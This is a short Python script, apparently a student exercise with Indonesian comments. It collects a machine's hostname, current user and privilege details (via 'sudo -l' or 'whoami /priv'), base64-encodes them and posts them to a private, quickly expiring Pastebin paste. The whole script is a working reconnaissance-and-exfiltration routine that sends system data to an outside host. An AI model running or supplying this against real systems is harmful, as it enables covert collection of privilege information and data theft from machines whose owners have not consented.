# Fabian Ferristo Tirtabudi - 2301864581 #

import base64
import platform
import requests
import socket
import subprocess

api_dev_key = '' # masukkan api_dev_key
api_user_key = '' # masukkan api_user_key
api_paste_name = '' # masukkan nama paste yang diinginkan

hostname = socket.gethostname()
user = str(subprocess.check_output("whoami").decode('utf-8').strip())

if platform.system() == "Linux":
    priv = subprocess.check_output(["sudo", "-l"]).decode('utf-8').strip()

elif platform.system() == "Windows":
    priv = subprocess.check_output("whoami /priv").decode('utf-8').strip()

print("Hostname: " + hostname)
print("User: " + user)
print("Privileges: \n" + priv)

info = base64.b64encode(("Hostname: " + hostname + "\r\nUser: " + user + "\r\nPrivileges:\r\n" + priv).encode())

data = {
    'api_dev_key': api_dev_key,
    'api_user_key': api_user_key,
    'api_paste_name' : api_paste_name,
    'api_paste_code': info,
    'api_option': 'paste',
    'api_paste_private': 2,
    'api_paste_expire_date': '10M'
}

url = requests.post(url='https://pastebin.com/api/api_post.php', data=data).text
print("\n---------------------------------------------")
print("Pastebin link: " + url)
print("---------------------------------------------")
